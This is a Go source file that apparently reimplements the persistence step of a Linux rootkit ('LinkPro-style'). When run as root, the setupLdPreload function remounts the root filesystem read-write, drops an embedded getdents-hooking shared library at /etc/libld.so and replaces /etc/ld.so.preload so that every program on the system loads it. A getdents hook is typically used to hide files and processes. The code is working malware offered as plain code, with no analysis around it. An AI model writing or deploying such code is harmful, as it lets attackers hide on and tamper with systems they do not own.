package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/sys/unix"
)

//go:embed preload/getdents_preload.so
var preloadEmbed []byte

// setupLdPreload implements LinkPro-style LD_PRELOAD: extracts the embedded
// libld.so (getdents_preload) to /etc/libld.so, backs up /etc/ld.so.preload,
// and writes /etc/libld.so to ld.so.preload so all programs load it.
func setupLdPreload() error {
	if unix.Geteuid() != 0 {
		return nil 
	}
	if len(preloadEmbed) == 0 {
		return fmt.Errorf("preload not embedded")
	}

	if out, err := exec.Command("mount", "-o", "remount,rw", "/").CombinedOutput(); err != nil {
		return fmt.Errorf("remount rw: %v %s", err, out)
	}

	existing, _ := os.ReadFile("/etc/ld.so.preload")
	existingStr := strings.TrimSpace(string(existing))

	if strings.Contains(existingStr, libldPath) {
		if _, err := os.Stat(libldPath); err == nil {
			return nil 
		}
	}

	if err := os.WriteFile(ldPreloadBak, existing, 0644); err != nil {
		return fmt.Errorf("backup ld.so.preload: %w", err)
	}

	// Extract embedded preload to /etc/libld.so
	if err := os.WriteFile(libldPath, preloadEmbed, 0755); err != nil {
		os.Remove(ldPreloadBak)
		return fmt.Errorf("write %s: %w", libldPath, err)
	}

	// Replace ld.so.preload with our library path
	content := libldPath + "\n"
	if err := os.WriteFile("/etc/ld.so.preload", []byte(content), 0644); err != nil {
		os.Remove(libldPath)
		os.Remove(ldPreloadBak)
		return fmt.Errorf("write ld.so.preload: %w", err)
	}
	return nil
}
